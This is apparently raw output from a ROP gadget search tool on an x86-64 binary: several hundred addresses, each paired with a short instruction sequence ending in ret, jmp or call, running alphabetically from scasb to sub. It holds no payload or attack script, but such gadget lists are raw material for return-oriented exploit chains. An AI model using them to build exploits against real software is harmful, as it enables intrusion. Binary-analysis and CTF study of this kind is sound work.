0x000000000044ea99 : scasb al, byte ptr [rdi] ; call 0x45b533
0x0000000000495325 : scasb al, byte ptr [rdi] ; cli ; inc eax ; scasd eax, dword ptr [rdi] ; cli ; call qword ptr [rax]
0x00000000004a8f89 : scasb al, byte ptr [rdi] ; or dh, byte ptr [rbp + 0x23] ; retf 0x32dd
0x000000000041d47e : scasb al, byte ptr [rdi] ; ret
0x000000000049462d : scasb al, byte ptr [rdi] ; stc ; jmp rax
0x0000000000495950 : scasb al, byte ptr [rdi] ; sti ; jmp qword ptr [rcx]
0x0000000000495aec : scasb al, byte ptr [rdi] ; sti ; jmp rdx
0x00000000004404cd : scasd eax, dword ptr [rdi] ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000495329 : scasd eax, dword ptr [rdi] ; cli ; call qword ptr [rax]
0x00000000004150be : scasd eax, dword ptr [rdi] ; nop ; xor eax, eax ; ret
0x000000000040e4f9 : scasd eax, dword ptr [rdi] ; ret
0x000000000045b8ce : scasd eax, dword ptr [rdi] ; ret 0x148
0x0000000000411ec6 : scasd eax, dword ptr [rdi] ; ret 0x2948
0x000000000041a159 : scasd eax, dword ptr [rdi] ; ret 0x8948
0x0000000000448d43 : scasd eax, dword ptr [rdi] ; ret 0xf8e9
0x000000000047e8ad : scasd eax, dword ptr [rdi] ; retf 0x14c
0x00000000004945f1 : scasd eax, dword ptr [rdi] ; stc ; inc eax ; mov al, 0xf9 ; call qword ptr [rax]
0x00000000004a7cb4 : scasd eax, dword ptr [rdi] ; xchg byte ptr [rdi - 0x7c], dl ; xchg dword ptr [rax], edi ; in eax, 0xe5 ; retf 0x2a91
0x00000000004a6f2f : scasd eax, dword ptr [rdi] ; xlatb ; out 0xb3, al ; retf 0xe80
0x000000000044c68c : setae al ; ret
0x000000000045b5fa : sete dh ; mov dword ptr [rbx + 0x40], esi ; xor eax, eax ; pop rbx ; ret
0x00000000004190ec : setne al ; neg eax ; ret
0x000000000044dd20 : setne dl ; jmp 0x44dd08
0x0000000000423f3d : sgdt [rdi] ; add byte ptr [rax + 0x31], dl ; shr al, 0x57 ; ret
0x000000000042c17b : shl byte ptr [rax + 0x48], 1 ; clc ; vzeroupper ; ret
0x000000000042c13b : shl byte ptr [rax], 0x48 ; add eax, edi ; vzeroupper ; ret
0x000000000044709f : shl byte ptr [rsi + 0x44], 0xf ; out dx, eax ; ret 0xf66
0x000000000042514b : shl byte ptr [rsi + 0xf], 0x74 ; shl dword ptr [rsi + 0xf], 0x74 ; retf 0xf66
0x0000000000445443 : shl byte ptr [rsi + 0xf], 0xd7 ; ror dword ptr [rcx], cl ; ret 0xe074
0x0000000000440bf5 : shl byte ptr [rsi + 0xf], 0xeb ; ret 0xf66
0x000000000042e0ab : shl byte ptr [rsi + 0xf], 0xef ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x000000000042e0c2 : shl byte ptr [rsi + 0xf], 1 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x0000000000473496 : shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x00000000004734a7 : shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret 0xf66
0x000000000042dfa1 : shl byte ptr [rsi + 0xf], cl ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004a0290 : shl dword ptr [rax + rax], 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x00000000004a783d : shl dword ptr [rax - 0x6a5aa279], 1 ; retf 0x33e6
0x000000000041df5b : shl dword ptr [rcx], 1 ; retf 0xf989
0x0000000000400b08 : shl dword ptr [rdi + 0x5d01002b], cl ; ret
0x00000000004a7b28 : shl dword ptr [rdi - 5], 1 ; ret
0x0000000000447082 : shl dword ptr [rsi + 0x44], 0xf ; out dx, eax ; retf 0x4466
0x000000000042514f : shl dword ptr [rsi + 0xf], 0x74 ; retf 0xf66
0x0000000000473492 : shl dword ptr [rsi + 0xf], 0xd7 ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x0000000000446efb : shl dword ptr [rsi + 0xf], 0xda ; ret
0x000000000042e026 : shl dword ptr [rsi + 0xf], 0xef ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000042e0dd : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x2373
0x000000000042e0c6 : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x000000000042e0af : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x000000000042cb6b : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000042e041 : shl dword ptr [rsi + 0xf], 1 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000042bacc : shl dword ptr [rsi + 0xf], 1 ; xlatb ; ret 0xc085
0x000000000042df01 : shl dword ptr [rsi + 0xf], cl ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000044e9b1 : shl eax, cl ; pop rbp ; pop r12 ; ret
0x000000000044e9ad : shl ecx, 3 ; pop rbx ; shl eax, cl ; pop rbp ; pop r12 ; ret
0x0000000000482f3c : shl ecx, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x0000000000482ec7 : shl ecx, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x0000000000482e96 : shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x0000000000487270 : shl edx, 5 ; add rdx, rax ; jmp 0x487286
0x0000000000482f3b : shl r9, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x0000000000482ec6 : shl r9, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x0000000000482e95 : shl r9, cl ; mov qword ptr [rdi], r9 ; ret
0x000000000048726f : shl rdx, 5 ; add rdx, rax ; jmp 0x487287
0x0000000000423f43 : shr al, 0x57 ; ret
0x00000000004b4790 : shr al, 1 ; cld ; jmp qword ptr [rcx]
0x0000000000494694 : shr al, 1 ; stc ; call rax
0x00000000004a70e4 : shr al, cl ; add al, 0x3d ; retf
0x00000000004267ff : shr byte ptr [rcx], 0xc8 ; ret
0x0000000000424daa : shr byte ptr [rcx], cl ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x0000000000458178 : shr byte ptr [rcx], cl ; ret
0x000000000042c43b : shr byte ptr [rcx], cl ; rol bl, 1 ; nop ; xor eax, eax ; ret
0x0000000000494ff8 : shr byte ptr [rdi], cl ; cli ; inc dword ptr [rdx + 0x2f] ; cli ; call rdx
0x00000000004a8ee7 : shr byte ptr [rdx], 0x43 ; add cl, bl ; retf 0xea91
0x000000000044da84 : shr ch, 0x26 ; add cl, ch ; retf
0x000000000048cce2 : shr cl, 1 ; ret 0xfffe
0x000000000046832c : shr cl, cl ; jrcxz 0x468338 ; dec dword ptr [rbp - 0x77] ; ret 0x894c
0x000000000048c7ef : shr cl, cl ; ret
0x0000000000459cdf : shr cl, cl ; retf
0x0000000000494698 : shr dl, 1 ; stc ; call rax
0x0000000000448a1a : shr eax, 0xe ; and eax, 0x3fc00 ; pop rbx ; ret
0x000000000047455b : shr eax, 2 ; ret
0x0000000000474a63 : shr eax, 2 ; vzeroupper ; ret
0x0000000000448a65 : shr eax, 6 ; and eax, 0x3fffc00 ; pop rbx ; ret
0x000000000041f5ee : shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; pop rbx ; ret
0x000000000048304c : shr ecx, cl ; mov qword ptr [rdi + 0x10], r9 ; ret
0x0000000000482fd1 : shr ecx, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x0000000000482fa0 : shr ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x000000000048304b : shr r9, cl ; mov qword ptr [rdi + 0x10], r9 ; ret
0x0000000000482fd0 : shr r9, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x0000000000482f9f : shr r9, cl ; mov qword ptr [rdi], r9 ; ret
0x000000000047455a : shr rax, 2 ; ret
0x0000000000474a62 : shr rax, 2 ; vzeroupper ; ret
0x000000000049f469 : sldt word ptr [rax] ; ret
0x0000000000454438 : stc ; add al, 0x74 ; and eax, 0x833fe283 ; retf 0x4180
0x0000000000473d96 : stc ; add byte ptr [rax + rax], cl ; add byte ptr [rbx + rax - 0xd], dh ; ret
0x000000000042b8e7 : stc ; add byte ptr [rax], al ; add byte ptr [rbp - 0x77], cl ; retf
0x00000000004944fa : stc ; call qword ptr [rax + 0x20fff9c4]
0x00000000004947f6 : stc ; call qword ptr [rax - 0x1f000626]
0x00000000004947a2 : stc ; call qword ptr [rax - 0x1f00062d]
0x000000000049462a : stc ; call qword ptr [rax - 0x1f000652]
0x00000000004945d6 : stc ; call qword ptr [rax - 0x1f000659]
0x0000000000494232 : stc ; call qword ptr [rax - 0x2f0006e0]
0x0000000000494222 : stc ; call qword ptr [rax - 0x2f0006e5]
0x0000000000494212 : stc ; call qword ptr [rax - 0x2f0006ea]
0x0000000000494202 : stc ; call qword ptr [rax - 0x2f0006ef]
0x00000000004944f6 : stc ; call qword ptr [rax - 0x6f00063e]
0x000000000049454e : stc ; call qword ptr [rax]
0x00000000004afc82 : stc ; call qword ptr [rbx]
0x0000000000494392 : stc ; call qword ptr [rcx + 0x11fff997]
0x000000000049439a : stc ; call qword ptr [rcx + 0x11fff998]
0x00000000004943a2 : stc ; call qword ptr [rcx + 0x21fff999]
0x0000000000494386 : stc ; call qword ptr [rcx]
0x00000000004afbf6 : stc ; call qword ptr [rdx]
0x00000000004943ea : stc ; call qword ptr [rsi + 0x26fff99a]
0x0000000000494216 : stc ; call rax
0x000000000049434e : stc ; call rcx
0x00000000004b045e : stc ; call rsi
0x00000000004afb7e : stc ; call rsp
0x0000000000491077 : stc ; clc ; push rbx ; ret
0x00000000004953b9 : stc ; cli ; call rax
0x00000000004953bd : stc ; cli ; inc eax ; cld ; cli ; call rax
0x00000000004632ee : stc ; dec dword ptr [rax + 0x29] ; ret
0x0000000000468aa5 : stc ; dec dword ptr [rax - 0x39] ; ret 0xffa0
0x00000000004900f3 : stc ; dec dword ptr [rax - 0x77] ; fucomip st(0) ; ret
0x00000000004b0c19 : stc ; hlt ; jmp qword ptr [rbx]
0x0000000000492859 : stc ; idiv bh ; jmp 0xffffffffe1491f5f
0x000000000049471e : stc ; inc dword ptr [rax + 0x40fff9de] ; loopne 0x494729 ; jmp qword ptr [rax]
0x000000000049467e : stc ; inc dword ptr [rax + 0x40fff9df] ; loope 0x494689 ; jmp qword ptr [rax]
0x0000000000494312 : stc ; inc dword ptr [rax + 0x6d] ; stc ; push qword ptr [rax] ; outsb dx, byte ptr [rsi] ; stc ; jmp qword ptr [rax]
0x000000000049470a : stc ; inc dword ptr [rax - 0x1c] ; stc ; jmp qword ptr [rax]
0x0000000000494666 : stc ; inc dword ptr [rax - 0x1d] ; stc ; jmp qword ptr [rax]
0x0000000000494682 : stc ; inc dword ptr [rax - 0x1f] ; stc ; jmp qword ptr [rax]
0x0000000000494722 : stc ; inc dword ptr [rax - 0x20] ; stc ; jmp qword ptr [rax]
0x000000000049473e : stc ; inc dword ptr [rax - 0x22] ; stc ; inc dword ptr [rax] ; loopne 0x494749 ; call rax
0x00000000004947f2 : stc ; inc dword ptr [rax - 0x27] ; stc ; call qword ptr [rax - 0x1f000626]
0x000000000049479e : stc ; inc dword ptr [rax - 0x2e] ; stc ; call qword ptr [rax - 0x1f00062d]
0x00000000004947ae : stc ; inc dword ptr [rax - 0x2f000629] ; fdivr st(1) ; jmp qword ptr [rax]
0x00000000004947c2 : stc ; inc dword ptr [rax - 0x2f000637] ; retf 0xfff9
0x00000000004945e2 : stc ; inc dword ptr [rax - 0x2f000655] ; lodsb al, byte ptr [rsi] ; stc ; jmp qword ptr [rax]
0x00000000004945ae : stc ; inc dword ptr [rax - 0x43] ; stc ; call qword ptr [rax]
0x0000000000494486 : stc ; inc dword ptr [rax - 0x45] ; stc ; jmp qword ptr [rax]
0x0000000000494626 : stc ; inc dword ptr [rax - 0x53] ; stc ; call qword ptr [rax - 0x1f000652]
0x00000000004945d2 : stc ; inc dword ptr [rax - 0x5a] ; stc ; call qword ptr [rax - 0x1f000659]
0x0000000000494462 : stc ; inc dword ptr [rax - 0x67] ; stc ; call rax
0x000000000049472a : stc ; inc dword ptr [rax] ; in al, 0xf9 ; jmp rax
0x000000000049468a : stc ; inc dword ptr [rax] ; in eax, 0xf9 ; jmp rax
0x0000000000494322 : stc ; inc dword ptr [rax] ; jno 0x494329 ; push rax ; jno 0x49432d ; jmp rax
0x00000000004946a6 : stc ; inc dword ptr [rax] ; jrcxz 0x4946a9 ; jmp rax
0x0000000000494742 : stc ; inc dword ptr [rax] ; loopne 0x494745 ; call rax
0x00000000004942de : stc ; inc dword ptr [rax] ; pop rbp ; stc ; push qword ptr [rax + 0x5e] ; stc ; jmp rax
0x0000000000494496 : stc ; inc dword ptr [rax] ; ret
0x000000000049425e : stc ; inc dword ptr [rax] ; xor cl, bh ; jmp qword ptr [rax]
0x00000000004943ae : stc ; inc dword ptr [rcx - 0x65] ; stc ; call rcx
0x0000000000494382 : stc ; inc dword ptr [rcx - 0x6c] ; stc ; call qword ptr [rcx]
0x000000000049445e : stc ; inc eax ; cwde ; stc ; inc dword ptr [rax - 0x67] ; stc ; call rax
0x00000000004945f2 : stc ; inc eax ; mov al, 0xf9 ; call qword ptr [rax]
0x00000000004944d6 : stc ; inc eax ; ret 0xfff9
0x000000000043f482 : stc ; je 0x43f44e ; lea r10, [r10 + r9] ; jmp r10
0x0000000000494c82 : stc ; jmp qword ptr [rax + 0x20fff9ec]
0x0000000000494cc6 : stc ; jmp qword ptr [rax + 0x20fff9ee]
0x0000000000494c8a : stc ; jmp qword ptr [rax + 0x20fff9ef]
0x0000000000494cce : stc ; jmp qword ptr [rax + 0x20fff9f1]
0x0000000000494c92 : stc ; jmp qword ptr [rax + 0x20fff9f2]
0x0000000000494cd6 : stc ; jmp qword ptr [rax + 0x20fff9f4]
0x0000000000494c9a : stc ; jmp qword ptr [rax + 0x20fff9f5]
0x0000000000494cde : stc ; jmp qword ptr [rax + 0x20fff9f7]
0x0000000000494ca2 : stc ; jmp qword ptr [rax + 0x20fff9f8]
0x0000000000494ce6 : stc ; jmp qword ptr [rax + 0x20fff9fa]
0x0000000000494caa : stc ; jmp qword ptr [rax + 0x20fff9fb]
0x0000000000494cee : stc ; jmp qword ptr [rax + 0x20fff9fd]
0x0000000000494cb2 : stc ; jmp qword ptr [rax + 0x20fff9fe]
0x0000000000494cf6 : stc ; jmp qword ptr [rax + 0x20fffa00]
0x000000000049434a : stc ; jmp qword ptr [rax - 0x2e00066a]
0x000000000049459a : stc ; jmp qword ptr [rax - 0x3d]
0x0000000000494252 : stc ; jmp qword ptr [rax - 0x3f0006d4]
0x0000000000494242 : stc ; jmp qword ptr [rax]
0x00000000004af9ca : stc ; jmp qword ptr [rbx]
0x00000000004943a6 : stc ; jmp qword ptr [rcx]
0x0000000000494366 : stc ; jmp qword ptr [rdx]
0x00000000004943c2 : stc ; jmp qword ptr [rsi]
0x000000000049425a : stc ; jmp rax
0x00000000004afc46 : stc ; jmp rbx
0x00000000004a79a4 : stc ; jnp 0x4a7963 ; ret
0x0000000000494346 : stc ; lcall [rsi - 0x5f00066b] ; xchg eax, esi ; stc ; call rcx
0x0000000000430988 : stc ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000042a007 : stc ; or dword ptr [rax], eax ; add byte ptr [rbp - 0x77], cl ; retf
0x00000000004942e2 : stc ; push qword ptr [rax + 0x5e] ; stc ; jmp rax
0x00000000004945ee : stc ; push qword ptr [rax - 0x51] ; stc ; inc eax ; mov al, 0xf9 ; call qword ptr [rax]
0x00000000004947be : stc ; push qword ptr [rax - 0x7f00063a] ; leave ; stc ; call rax
0x000000000049464a : stc ; push qword ptr [rax] ; in eax, 0xf9 ; call qword ptr [rax]
0x000000000049454a : stc ; push qword ptr [rax] ; mov esp, 0xbe10fff9 ; stc ; jmp rax
0x0000000000494316 : stc ; push qword ptr [rax] ; outsb dx, byte ptr [rsi] ; stc ; jmp qword ptr [rax]
0x00000000004943aa : stc ; push qword ptr [rcx + 0x41fff99a] ; wait ; stc ; call rcx
0x00000000004943b6 : stc ; push qword ptr [rcx - 0x64] ; stc ; call qword ptr [rcx]
0x0000000000494326 : stc ; push rax ; jno 0x494329 ; jmp rax
0x00000000004946c2 : stc ; push rax ; loopne 0x4946c5 ; call rax
0x00000000004944ae : stc ; push rax ; mov esi, 0xc0e0fff9 ; stc ; jmp rax
0x0000000000403403 : stc ; retf
0x0000000000494ce5 : stc ; stc ; jmp qword ptr [rax + 0x20fff9fa]
0x00000000004392a4 : stc ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x000000000042c917 : stc ; xlatb ; ret 0xff2d
0x00000000004a4fd2 : std ; call qword ptr [rax]
0x00000000004b59d2 : std ; call qword ptr [rbx]
0x00000000004b5462 : std ; call qword ptr [rdx]
0x00000000004ab3ce : std ; call rax
0x00000000004b1bfa : std ; call rdx
0x00000000004ab3f2 : std ; call rsp
0x00000000004953d1 : std ; cli ; call qword ptr [rax]
0x00000000004953ed : std ; cli ; inc eax ; std ; cli ; jmp rax
0x00000000004953f1 : std ; cli ; jmp rax
0x000000000047645a : std ; dec dword ptr [rax + 0x39] ; ret
0x0000000000473db8 : std ; dec dword ptr [rax + 0xf] ; ret 0x90c3
0x000000000044ab9e : std ; dec dword ptr [rax - 0x77] ; ret
0x0000000000469ab2 : std ; dec dword ptr [rax - 0x7d] ; clc ; dec dword ptr [rax - 0x77] ; ret
0x0000000000424942 : std ; dec dword ptr [rbp - 0x7b] ; test byte ptr [rdi], 0x84 ; ret
0x00000000004ab3c6 : std ; dec dword ptr [rbx + 0x38fffdfc] ; cld ; std ; call rax
0x00000000004826fb : std ; inc dword ptr [rbp - 0x76b08a40] ; ret
0x00000000004a4fce : std ; inc eax ; jne 0x4a4fd5 ; call qword ptr [rax]
0x0000000000481bae : std ; jbe 0x481bbc ; ret
0x00000000004a4f46 : std ; jmp qword ptr [rax]
0x00000000004b51aa : std ; jmp qword ptr [rcx]
0x00000000004b1702 : std ; jmp qword ptr [rdi]
0x00000000004b0e22 : std ; jmp qword ptr [rdx]
0x00000000004ab3aa : std ; jmp rax
0x00000000004b4ada : std ; jmp rdx
0x00000000004b51de : std ; jmp rsp
0x00000000004a4f42 : std ; ljmp [rax + 0x73] ; std ; jmp qword ptr [rax]
0x00000000004301ab : std ; mov word ptr [rdi - 2], cx ; ret
0x000000000046111f : std ; pop rcx ; and eax, 0x48b4800 ; clc ; jmp rax
0x00000000004a4fca : std ; push qword ptr [rbx] ; xchg ch, bh ; inc eax ; jne 0x4a4fd9 ; call qword ptr [rax]
0x000000000044bbae : std ; push rbx ; ret
0x0000000000447803 : std ; rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x00000000004239af : std ; ret
0x00000000004a88da : std ; retf
0x000000000047fd5f : std ; retf 0x23
0x00000000004001c2 : std ; retf 0x6500
0x0000000000494cb1 : std ; stc ; jmp qword ptr [rax + 0x20fff9fe]
0x0000000000494cf1 : std ; stc ; jmp qword ptr [rax]
0x0000000000419ac2 : std ; sub dword ptr [rax], eax ; ret
0x000000000042c1e1 : std ; xlatb ; ret
0x000000000042c1d9 : std ; xlatb ; ret 0xc085
0x000000000042c753 : std ; xlatb ; ret 0xe883
0x0000000000473771 : std ; xlatb ; retf 0xc985
0x0000000000473644 : std ; xlatb ; retf 0xfdc5
0x00000000004736a4 : std ; xlatb ; rol ch, cl ; std ; xlatb ; ret
0x00000000004224d1 : sti ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000411fa3 : sti ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x0000000000496246 : sti ; call qword ptr [rax]
0x00000000004967f6 : sti ; call qword ptr [rdi]
0x00000000004967ee : sti ; call qword ptr [rdx]
0x0000000000495946 : sti ; call qword ptr [rsi]
0x00000000004954ae : sti ; call rax
0x0000000000495a92 : sti ; call rdi
0x00000000004499bf : sti ; dec dword ptr [rax - 0x77] ; ret
0x000000000049686a : sti ; dec dword ptr [rsi + rsi*2] ; sti ; jmp qword ptr [rax]
0x00000000004954ee : sti ; dec dword ptr [rsi] ; sti ; jmp qword ptr [rbx]
0x0000000000496866 : sti ; dec edi ; jne 0x49686f ; dec dword ptr [rsi + rsi*2] ; sti ; jmp qword ptr [rax]
0x0000000000495b0a : sti ; inc dword ptr [rax] ; sti ; jmp qword ptr [rcx]
0x0000000000495b36 : sti ; inc dword ptr [rbx + rax*2 - 5] ; jmp qword ptr [rcx]
0x0000000000495a8e : sti ; inc dword ptr [rdx + 0x44] ; sti ; call rdi
0x0000000000495b32 : sti ; inc dword ptr [rsi + 0x44fffb43] ; sti ; jmp qword ptr [rcx]
0x000000000049594a : sti ; inc dword ptr [rsi - 0x510004bc] ; sti ; jmp qword ptr [rcx]
0x000000000049626e : sti ; jmp qword ptr [rax]
0x00000000004954f2 : sti ; jmp qword ptr [rbx]
0x0000000000495952 : sti ; jmp qword ptr [rcx]
0x0000000000490710 : sti ; jmp qword ptr [rsi + 0xf]
0x0000000000495532 : sti ; jmp rbx
0x000000000049599e : sti ; jmp rdx
0x00000000004967be : sti ; jmp rsi
0x00000000004959de : sti ; jmp rsp
0x00000000004967f2 : sti ; lcall [rsi + 0x78] ; sti ; call qword ptr [rdi]
0x00000000004967ba : sti ; lcall [rsi] ; jns 0x4967bf ; jmp rsi
0x0000000000495942 : sti ; lcall [rsi] ; sti ; call qword ptr [rsi]
0x00000000004959b6 : sti ; ljmp [rax + 0x43] ; sti ; jmp qword ptr [rcx]
0x00000000004967ea : sti ; ljmp [rax + 0x76] ; sti ; call qword ptr [rdx]
0x000000000049593e : sti ; ljmp [rbx] ; sti ; lcall [rsi] ; sti ; call qword ptr [rsi]
0x0000000000495a8a : sti ; ljmp [rdi + 0x44] ; sti ; inc dword ptr [rdx + 0x44] ; sti ; call rdi
0x0000000000430588 : sti ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000496242 : sti ; push qword ptr [rax] ; jno 0x496247 ; call qword ptr [rax]
0x0000000000495ba2 : sti ; push qword ptr [rbx + rax*2] ; sti ; inc dword ptr [rbx + rax*2 - 5] ; jmp qword ptr [rcx]
0x0000000000495992 : sti ; push qword ptr [rbx + rax*2] ; sti ; jmp qword ptr [rcx]
0x000000000049598e : sti ; push qword ptr [rbx + rax*2] ; sti ; push qword ptr [rbx + rax*2] ; sti ; jmp qword ptr [rcx]
0x0000000000495a2a : sti ; push qword ptr [rdx + 0x43] ; sti ; jmp qword ptr [rcx]
0x0000000000496266 : sti ; push qword ptr [rsi + rbp*2 + 0x6eb4fffb] ; sti ; jmp qword ptr [rax]
0x0000000000496272 : sti ; push qword ptr [rsi + rbp*2 + 0x6ff8fffb] ; sti ; call rax
0x0000000000495b06 : sti ; push rsi ; sti ; inc dword ptr [rax] ; sti ; jmp qword ptr [rcx]
0x00000000004959da : sti ; push rsi ; sti ; jmp rsp
0x00000000004a7b2a : sti ; ret
0x0000000000494cad : sti ; stc ; jmp qword ptr [rax]
0x00000000004ab3a9 : sti ; std ; jmp rax
0x00000000004b2e11 : sti ; sti ; jmp qword ptr [rbx]
0x000000000045ae67 : sti ; test rax, rax ; je 0x45ae75 ; call rax
0x000000000046c79f : stosb byte ptr [rdi], al ; and al, 0 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000495319 : stosb byte ptr [rdi], al ; cli ; call rax
0x00000000004a8004 : stosb byte ptr [rdi], al ; cli ; ret 0xac65
0x000000000044852b : stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x000000000045ff21 : stosb byte ptr [rdi], al ; retf 0x25
0x0000000000424cc1 : stosd dword ptr [rdi], eax ; and dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000049531d : stosd dword ptr [rdi], eax ; cli ; jmp qword ptr [rax]
0x000000000046876e : stosd dword ptr [rdi], eax ; mov eax, 1 ; ret
0x0000000000490241 : stosd dword ptr [rdi], eax ; mov edx, 0xe1750022 ; pop rbx ; ret
0x000000000041f5f3 : stosd dword ptr [rdi], eax ; pop rbx ; ret
0x000000000046766c : stosd dword ptr [rdi], eax ; ret
0x00000000004a900a : stosd dword ptr [rdi], eax ; retf 0xa2fe
0x00000000004945e5 : stosd dword ptr [rdi], eax ; stc ; call rax
0x00000000004b03b1 : stosd dword ptr [rdi], eax ; stc ; jmp qword ptr [rcx]
0x0000000000424f71 : stosd dword ptr [rdi], eax ; sub eax, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000041f5f2 : stosq qword ptr [rdi], rax ; pop rbx ; ret
0x00000000004a94f1 : sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x0000000000481ea6 : sub al, 0x48 ; add esp, 0x38 ; ret
0x0000000000448762 : sub al, 0x72 ; add cl, byte ptr [rax + 0x77f8c50f] ; ret
0x000000000044ce00 : sub al, 0x85 ; ror byte ptr [rdi], 0x84 ; retf 0
0x000000000042d6f3 : sub al, 0xa ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00000000004b0a98 : sub al, ah ; stc ; call qword ptr [rax]
0x0000000000419070 : sub al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004131b5 : sub al, byte ptr [rax] ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x0000000000419006 : sub al, byte ptr [rax] ; add dword ptr [rip + 0x2a2d05], 1 ; ret
0x0000000000418f75 : sub al, byte ptr [rax] ; ret
0x0000000000424d6a : sub al, byte ptr [rdx] ; add bh, dh ; ret 0
0x00000000004250b2 : sub al, byte ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000042cab5 : sub al, ch ; std ; xlatb ; ret
0x0000000000494c80 : sub bl, 0xf9 ; jmp qword ptr [rax + 0x20fff9ec]
0x000000000046374b : sub bl, cl ; in eax, 0xdf ; loopne 0x4636e0 ; ret
0x000000000047737c : sub byte ptr [rax + 0x39], cl ; ret 0x870f
0x000000000041694c : sub byte ptr [rax + 0x39], cl ; retf
0x000000000047737b : sub byte ptr [rax + 0x39], r9b ; ret 0x870f
0x0000000000483a33 : sub byte ptr [rax + 1], cl ; ret 0x1474
0x0000000000458bcb : sub byte ptr [rax - 0x3f], cl ; retf
0x00000000004231a4 : sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x000000000048c2ec : sub byte ptr [rax - 0x77], cl ; ret
0x000000000046fb34 : sub byte ptr [rax - 0x77], cl ; ret 0xc148
0x0000000000404af3 : sub byte ptr [rax - 0x7d], cl ; ret
0x000000000040d909 : sub byte ptr [rax - 0x7d], cl ; retf 0x4805
0x000000000040d974 : sub byte ptr [rax - 0x7d], cl ; retf 0x4806
0x000000000040da29 : sub byte ptr [rax - 0x7d], cl ; retf 0x480d
0x000000000040d9a6 : sub byte ptr [rax - 0x7d], cl ; retf 0xe903
0x000000000040d95f : sub byte ptr [rax - 0x7d], cl ; retf 0xeb04
0x000000000040d9be : sub byte ptr [rax - 0x7d], cl ; retf 0xeb07
0x000000000040da5f : sub byte ptr [rax - 0x7d], cl ; retf 0xeb0c
0x00000000004843cd : sub byte ptr [rax], al ; add byte ptr [rax], al ; jne 0x484415 ; leave ; ret
0x000000000048f142 : sub byte ptr [rbp + 1], cl ; retf
0x000000000047800e : sub byte ptr [rbp + rcx*4 + 0x15], cl ; ret
0x0000000000449524 : sub byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x0000000000488203 : sub byte ptr [rbx - 0x26], dh ; mov eax, 1 ; ret
0x0000000000488202 : sub byte ptr [rbx - 0x26], sil ; mov eax, 1 ; ret
0x00000000004945e4 : sub byte ptr [rbx - 0x532f0007], 0xf9 ; jmp qword ptr [rax]
0x000000000040401b : sub byte ptr [rcx - 0x75], al ; push rdi ; or al, 0xf ; retf 0xd289
0x000000000040404f : sub byte ptr [rcx - 0x75], al ; push rdi ; sbb byte ptr [rdi], cl ; retf 0xd289
0x000000000044c92c : sub byte ptr [rcx], al ; ret
0x0000000000421fc6 : sub byte ptr [rdi], cl ; test ebx, esi ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000495318 : sub byte ptr [rdx - 0x542f0006], 0xfa ; jmp qword ptr [rax]
0x00000000004ac460 : sub byte ptr [rdx], 0xf6 ; call qword ptr [rax]
0x0000000000424eca : sub byte ptr [rdx], al ; add bh, dh ; ret 0
0x0000000000424f0b : sub byte ptr [rdx], al ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x000000000044dce2 : sub ch, ah ; add byte ptr es:[rbp - 0xcf98b40], al ; ret
0x0000000000468196 : sub cl, bpl ; ret 0xffe8
0x000000000040ec5d : sub cl, byte ptr [rax - 0x77] ; ror byte ptr [rax - 0x7d], 1 ; ret 0x4801
0x0000000000468197 : sub cl, ch ; ret 0xffe8
0x000000000045e244 : sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x00000000004ac461 : sub dh, dh ; call qword ptr [rax]
0x00000000004ac475 : sub dh, dh ; call qword ptr [rdx]
